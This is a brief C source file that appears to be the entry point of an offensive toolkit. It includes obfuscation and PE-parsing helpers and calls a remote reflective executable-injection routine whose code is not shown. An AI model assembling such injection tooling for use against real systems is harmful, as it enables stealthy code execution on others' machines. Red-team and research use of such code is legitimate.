#include <stdio.h> 
#include "Shared\stringUtilities.c"
#include "Shared\peParser.c"
#include "Shared\obfuscation.c"
#include "Techniques/Injections/remoteReflectiveExeInjectionOverlay.c"

int main(int argc, char *argv[]){
    remoteExeInjection();

    return 0;
}

